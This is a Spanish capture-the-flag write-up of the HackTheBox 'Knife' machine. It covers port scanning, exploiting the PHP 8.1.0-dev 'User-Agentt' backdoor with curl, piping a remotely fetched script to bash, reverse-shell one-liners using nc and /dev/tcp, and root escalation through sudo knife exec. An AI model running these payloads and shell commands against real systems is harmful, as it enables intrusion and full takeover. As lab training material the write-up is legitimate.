---
layout      : post
title       : "HackTheBox - Knife"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347banner.png
category    : [ htb ]
tags        : [ PHP-explotation, knife, chef, sudo ]
---
Máquina Linux nivel fácil, explotaremos **PHP** y jugaremos con la herramienta **knife** para ejecutar código **Ruby** como el usuario **root** (mediante **sudo**).

![347knifeHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347knifeHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [MrKN16H](https://www.hackthebox.eu/profile/98767).

Las locuras de nuestra existencia e.e

Hohoholaaa, en esta máquina nos encontraremos un servidor web con una versión `PHP` vulnerable a ejecución remota de comandos, la usaremos para obtener una **Reverse Shell** como el usuario `james`.

Enumerando los permisos que tenemos como otros usuarios (`sudo`), veremos que podemos ejecutar un binario llamado `knife`, buscando en internet formas de escalar privilegios usandolo, llegaremos a encontrar el subcomando `exec`, con él podremos ejecutar scripts o comandos `Ruby`, lo usaremos para establecer una **Shell** como el usuario `root` en el sistema.

...

### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Bastante juguetona, un poquito de movimientos con las manos (: y alguna que otra vuln conocida.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

Moving fast...

1. [Reconocimiento](#reconocimiento).
  * [Escaneo de puertos mediante **nmap**](#enum-nmap).
2. [Enumeración](#enumeracion).
  * [Vemos que hay en el puerto 80](#puerto-80).
3. [Explotación](#explotacion).
  * [Jugamos con la vulnerabilidad de **PHP** para conseguir **RCE**](#expl-revsh-james).
4. [Escalada de privilegios](#escalada-de-privilegios).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

...

## Escaneo de puertos con <u>nmap</u> [📌](#enum-nmap) {#enum-nmap}

Empezaremos haciendo un escaneo de puertos, esto nos permitirá conocer que servicios esta corriendo el sistema, usaremos **nmap**:

```bash
❱ nmap -p- --open -v 10.10.10.242 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Obtenemos:

```bash
❱ cat initScan
# Nmap 7.80 scan initiated Sun Jun 20 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.242
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.242 ()	Status: Up
Host: 10.10.10.242 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Sun Jun 20 25:25:25 2021 -- 1 IP address (1 host up) scanned in 77.55 seconds
```

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Obtención de una Shell de manera segura |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Servidor web |

Ahora que tenemos los puertos, hagamos un escaneo más reducido, en él buscaremos que versiones y scripts están relacionados con cada servicio:

**~(Usando la función `extractPorts` (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, que en este caso daría igual, ya que son 2 puertos no más, pero esto es muy funcional cuando tenemos varios puertos, así no tendríamos que ir uno a uno**
 
```bash
❱ extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.242
    [*] Open ports: 22,80

[*] Ports copied to clipboard
```

**)~**

```bash
❱ nmap -p 22,80 -sC -sV 10.10.10.242 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

Tendriamos:

```bash
❱ cat portScan
# Nmap 7.80 scan initiated Sun Jun 20 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.242
Nmap scan report for 10.10.10.242
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 20 25:25:25 2021 -- 1 IP address (1 host up) scanned in 11.71 seconds
```

Cositas relevantes:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 |
| 80     | HTTP     | Apache/2.4.41 |

Pero por ahora poco más, así que empecemos a explorar cada puerto y veamos por donde pinchar.

...

# Enumeración [#](#enumeracion) {#enumeracion}

...

## Puerto 80 [📌](#puerto-80) {#puerto-80}

![347page80](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347page80.png)

Encontramos una interfaz bastante simple, sin posibilidad de interactuar con ella ni movernos por ahí...

Buscando vulnerabilidades relacionadas con `Apache 2.4.41` no encontramos nada útil. 

...

# Explotación [#](#explotacion) {#explotacion}

Jugando con **Wappalyzer** (extensión web) vemos que el servidor web cuenta con el servicio **PHP** en su versión `8.1.0`, buscando en internet vulnerabilidades sobre ella, encontramos una interesante:

* [**PHP 8.1.0-dev** Backdoor Remote Command Injection](https://packetstormsecurity.com/files/162749/PHP-8.1.0-dev-Backdoor-Remote-Command-Injection.html).
* [**PHP 8.1.0-dev** - 'User-Agentt' Remote Code Execution](https://www.exploit-db.com/exploits/49933).

Usándola podremos conseguir ejecución remota de comandos aprovechándonos de la función [zend_eval_string()](https://flylib.com/books/en/2.565.1/calling_back_into_php.html) (que puede ejecutar pequeños fragmentos de código en el sistema) de **PHP**, el código vulnerable es este:

```php
...
  convert_to_string(enc);
  if (strstr(Z_STRVAL_P(enc), "zerodium")) {
    zend_try {
      zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
...
```

Donde prácticamente lo que hace es:

1. Pasa (según el nombre de la función) lo que llegue (`enc`) a cadena de texto.
2. Si ese contenido (`enc`) a la primera encuentra ([strstr](https://www.php.net/manual/es/function.strstr.php)) la cadena "**zerodium**" en `enc`.
3. Entra a ejecutar ([zend_eval_string](https://flylib.com/books/en/2.565.1/calling_back_into_php.html)) el contenido de `enc`.
  * Así que simplemente deberíamos aprovechar que entre en esta función e indicarle que nos ejecute algo (con ayuda de `system()` o `exec()` o `shell_exec` o lo que sea :P)

Esto tiene que hacerse con el header `User-Agentt`, donde su contenido sea el que contenga **zerodium...**, siguiendo los **pocs** vemos que su explotación es muy sencilla, podemos jugar con `curL` y probar:

---

## Jugamos con la vulnerabilidad de <u>PHP 8.1.0</u> [📌](#expl-revsh-james) {#expl-revsh-james}

Por ejemplo, si queremos ejecutar el comando `whoami`, haríamos:

```bash
❱ curl -s http://10.10.10.242/ -H 'User-Agentt: zerodium;system("whoami");' | head -n 1
james
```

O para ver el `id` de (en este caso) **james**:

```bash
❱ curl -s http://10.10.10.242/ -H 'User-Agentt: zerodium;system("id");' | head -n 1
uid=1000(james) gid=1000(james) groups=1000(james)
```

Así que ya tenemos constancia que estamos ejecutando comandos en el sistema, pero ¿sobre cuál?

```bash
❱ curl -s http://10.10.10.242/ -H 'User-Agentt: zerodium;system("hostname");' | head -n 1
knife
```

Bien, al parecer estamos sobre el sistema base y no sobre algún contenedor, pues aprovechemos esto para obtener una Reverse Shell en el sistema...

Podríamos colocar el comando dentro de la función `system()`, pero para trabajar un poco más organizados y no estar cambiando muchas cosas, vamos a crear un archivo `.sh` el cual contendrá nuestro código a ejecutar en el sistema yyy lo único que haremos sera decirle al sistema que venga a buscarlo (:

Pero primero validemos si existe `curL` en la máquina:

```bash
❱ curl -s http://10.10.10.242/ -H 'User-Agentt: zerodium;system("which curl");' | head -n 1
/usr/bin/curl
```

Bien, entonces ahora si creemos el archivo `.sh`:

```bash
❱ cat rev.sh 
#!/bin/bash

id | nc 10.10.14.103 4433
```

Inicialmente le diremos que nos envíe al puerto **4433** de nuestra máquina el resultado del comando **id**. (Esto nos sirve para comprobar si existe `nc`, si nos lee el archivo `.sh` y reafirmamos el **RCE**)

Pongámonos en escucha por el puerto **4433**:

```bash
❱ nc -lvp 4433
listening on [any] 4433 ...
```

Y levantemos nuestro servidor web, así jugando con `curL` lograremos que la máquina encuentre nuestro archivo `.sh`:

```bash
❱ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Ahora sí, ejecutamos:

```bash
❱ curl -s http://10.10.10.242/ -H 'User-Agentt: zerodium;system("/usr/bin/curl http://10.10.14.103:8000/rev.sh");' | head
#!/bin/bash

id | nc 10.10.14.103 4433
<!DOCTYPE html>
...
```

Lo lee, solo nos queda indicarle que en vez de leer el script lo interprete, o sea, lo ejecute:

```bash
❱ curl -s http://10.10.10.242/ -H 'User-Agentt: zerodium;system("/usr/bin/curl http://10.10.14.103:8000/rev.sh | bash");' | head
```

Y en nuestro listener obtenemos:

![347bash_phpvuln_idNC](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347bash_phpvuln_idNC.png)

Perfessssssto, pues ahora si hagamos la **Reverse Shell**, lo único que debemos cambiar es nuestro archivo `.sh` y volvernos a poner en escucha:

```bash
❱ cat rev.sh 
#!/bin/bash

nc 10.10.14.103 4433 -e /bin/bash
```

Con esto le indicamos que apenas establezca la conexión con el puerto **4433** de nuestra máquina nos lance una `/bin/bash` (una **Shell**)...

Pero ejecutando de nuevo no conseguimos nada. 

Lo más probable es que la versión de **nc** que tenga el sistema sea la que **no soporta** el uso del parámetro `-e`, así que modifiquemos el archivo `.sh` con otra opción:

```bash
❱ cat rev.sh 
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.103/4433 0>&1'
```

Prácticamente le indicamos lo mismo, "apenas obtengas la conexión con el puerto lánzame una `bash`", ejecutamos nuestro `curL` yyyyy:

```bash
❱ curl -s http://10.10.10.242/ -H 'User-Agentt: zerodium;system("/usr/bin/curl http://10.10.14.103:8000/rev.sh | bash");'
```

![347bash_phpvuln_jamesRevSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347bash_phpvuln_jamesRevSH.png)

Bien, ahora tenemos una **Shell** como **james** en la máquina (:

## Tratamiento de la TTY

Antes de seguir hagamos nuestra terminal un poco más amigable, permitiéndonos así ejecutar `CTRL+C`, tener histórico de comandos y movernos entre ellos:

```bash
james@knife:/$ script /dev/null -c bash
#Ejecutamos CTRL+Z
james@knife:/$ ^Z 
[1]+  Detenido                nc -lvp 4433
```

Después escribimos:

```bash
❱ stty raw -echo; fg
```

Y aunque se vea corrido escribimos `reset` y después `xterm`:

```bash
            reset
reset: unknown terminal type unknown
Terminal type? xterm
```

Y por ultimo:

```bash
james@knife:/$ export TERM=xterm
james@knife:/$ export SHELL=bash
```

Nos apoyamos de otra ventana para obtener el tamaño de las filas y columnas, ejecutamos `stty -a`, tomamos esos valores y escribimos ahora en la máquina:

(Estos son los míos)

```bash
james@knife:/$ stty rows 43 columns 192
```

Y listo, podemos movernos libremente por la consola sin temor a perderla en algún `CTRL+C` y además tenemos histórico :)

...

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Viendo que permisos tenemos sobre otros usuarios ([sudo](https://es.wikipedia.org/wiki/Sudo) encontramos que podemos ejecutar un binario como **root**:

```bash
james@knife:~$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

Validando el binario, vemos varias cositas:

```bash
james@knife:~$ ls -la /usr/bin/knife
lrwxrwxrwx 1 root root 31 May  7 11:03 /usr/bin/knife -> /opt/chef-workstation/bin/knife
```

Es un **link simbólico** al binario `/opt/chef-workstation/bin/knife`, bien, rápidamente:

👩‍🍳 ***`Chef` [es un sistema de automatización](https://www.linkeit.com/es/blog/glosario-terminos-chef-server) que facilita el despliegue de servidores y aplicaciones.***

🔪 ***Y [Knife](https://docs.chef.io/workstation/knife/) es una herramienta de terminal que interactúa con un <u>servidor Chef</u>...***

Buscando cositas sobre ella y como aprovecharnos de su uso para escalar privilegios, encontramos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347google_knifelinuxexploit.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

**Knife** tiene un *subcomando* llamado `exec`, el cual permite la ejecución de scripts **Ruby**. 

Echándole un ojo a la [wiki de **knife_exec**](https://docs.chef.io/workstation/knife_exec/) encontramos su uso:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347google_wiki_knifelinuxexploit_opts.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347google_wiki_knifelinuxexploit_examples.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Tenemos la opción `-E` que ejecuta código directamente, pues intentemos jugar con ella...

* [How to run **System Commands** from Ruby](https://www.rubyguides.com/2018/12/ruby-system/).

Es muy simple, si queremos ejecutar el comando `id`, lo haríamos así:

```ruby
system("id")
```

¿Sencillito, no? Pues hagámoslo pero con **knife exec**:

```bash
james@knife:/$ /usr/bin/knife exec -E 'system("id")'
```

Ejecutamos para saber el **id** del usuario que esta ejecutando el proceso y obtenemos:

```bash
james@knife:/$ /usr/bin/knife exec -E 'system("id")'
WARNING: No knife configuration file found. See https://docs.chef.io/config_rb/ for details.
uid=1000(james) gid=1000(james) groups=1000(james)
```

Y si, nos ejecuta comandos en este caso como **james**, ya que no le hemos indicado que ejecute `/usr/bin/knife` con otros permisos o como otro usuario :P (sin [sudo](https://es.wikipedia.org/wiki/Sudo))

Ahora hagámoslo con los permisos del usuario **root** a ver si funciona (**sudo** solito le indica al sistema que queremos jugar con el usuario **root**, o también podríamos indicárselo usando `-u root`):

```bash
james@knife:/$ sudo /usr/bin/knife exec -E 'system("id")'
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347bash_knifeexec_idroot.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Opa la popa, estamos ejecutando comandos en el sistema como el usuario **root** 😃 Pues ejecutémonos una `/bin/bash` ahí de rapidez:

```bash
james@knife:/$ sudo /usr/bin/knife exec -E 'system("/bin/bash")'
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347bash_knifeexec_bash.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Listoneeeeeeeeeeeeeeeeeeees! Estamos dentro del sistema como el usuario **root** (: 

Vistaziemos las flags :o

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

ey, emho telminao'

...

Linda máquina, me gusto que es real-life, un **CVE** y una aplicación que por default tiene la opción de ejecutar comandos. 

Lo raro es que esta rateada super bajo y no me parecio que estuviera mal, como máquina para empezar esta muuuuuuuuuy bien.

Bueno, por ahora no es más que agradecimiento hacia la luna y el atardecer 😬 Nos leeremos en otra ocasión yyyyyyyyyyy como siempre, a seguir rompiendo tooooooooodo!!